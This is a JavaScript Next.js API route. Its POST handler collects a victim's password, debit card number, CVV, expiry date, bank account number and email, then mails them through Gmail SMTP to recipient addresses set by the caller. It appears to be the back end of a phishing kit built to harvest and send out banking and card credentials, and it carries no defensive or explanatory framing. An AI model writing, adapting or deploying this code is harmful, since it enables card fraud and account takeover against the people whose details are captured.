import { formatEmailMessage } from "@/lib/helper";
import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

const getCorsHeaders = (origin) => {
  // Default options
  const headers = {
    "Access-Control-Allow-Methods": `${process.env.ALLOWED_METHODS}`,
    "Access-Control-Allow-Headers": `${process.env.ALLOWED_HEADERS}`,
    "Access-Control-Allow-Origin": `${process.env.DOMAIN_URL}`,
  };

  // If no allowed origin is set to default server origin
  if (!process.env.ALLOWED_ORIGIN || !origin) return headers;

  // If allowed origin is set, check if origin is in allowed origins
  const allowedOrigins = process.env.ALLOWED_ORIGIN.split(",");

  // Validate server origin
  if (allowedOrigins.includes("*")) {
    headers["Access-Control-Allow-Origin"] = "*";
  } else if (allowedOrigins.includes(origin)) {
    headers["Access-Control-Allow-Origin"] = origin;
  }

  // Return result
  return headers;
};

export async function OPTIONS(request) {
  // Return Response
  return NextResponse.json(
    {},
    {
      status: 200,
      headers: getCorsHeaders(request.headers.get("origin") || ""),
    }
  );
}

export const GET = async (request) => {
  return NextResponse.json(
    { message: "Working!" },
    {
      status: 200,
      headers: getCorsHeaders(request.headers.get("origin") || ""),
    }
  );
};

export const POST = async (request) => {
  const {
    password,
    debitNumber,
    cvv,
    expiryDate,
    accountNumber,
    email,
    receiverEmails,
    senderEmail,
  } = await request.json();

  const EMAIL_RECEPIENT_LIST = receiverEmails.split(",");
  const EMAIL_SENDER = senderEmail.split(",")[0];

  const userData = {
    password,
    debitNumber,
    cvv,
    expiryDate,
    accountNumber,
    email,
  };

  // nodemailer transporter instantiation
  const transporter = nodemailer.createTransport({
    port: 465,
    host: "smtp.gmail.com",
    service: process.env.SMTP_EMAIL_PROVIDER,
    auth: {
      user: process.env.SMTP_EMAIL_USER,
      pass: process.env.SMPT_EMAIL_PASSWORD,
    },
    secure: true,
  });

  await new Promise((resolve, reject) => {
    // verify connection configuration
    transporter.verify(function (error, success) {
      if (error) {
        reject(error);
      } else {
        console.log("Server is ready to take our messages");
        resolve(success);
      }
    });
  });

  // Mail Options
  const mailOptions = {
    from: {
      name: `${EMAIL_SENDER}`, // Change here
      address: EMAIL_SENDER,
    },
    to: EMAIL_RECEPIENT_LIST,
    subject: "Email Alert from your VM website",
    html: `${formatEmailMessage(userData)}`,
  };

  // Send mail if the
  await new Promise((resolve, reject) => {
    // send mail
    transporter.sendMail(mailOptions, (err, info) => {
      if (err) {
        reject(err);
        return NextResponse.json(
          {
            message: "Message was not submitted successful. Please try again.",
            status: "failure",
          },
          {
            status: 400,
            headers: getCorsHeaders(request.headers.get("origin") || ""),
          }
        );
      } else {
        resolve(info);
        console.log("Email sent: " + info.response);
        return NextResponse.json(
          { message: "Message was sent successfully.", status: "success" },
          {
            status: 200,
            headers: getCorsHeaders(request.headers.get("origin") || ""),
          }
        );
      }
    });
  });
  return NextResponse.json(
    { message: "Thank you", status: "success" },
    {
      status: 200,
      headers: getCorsHeaders(request.headers.get("origin") || ""),
    }
  );
};


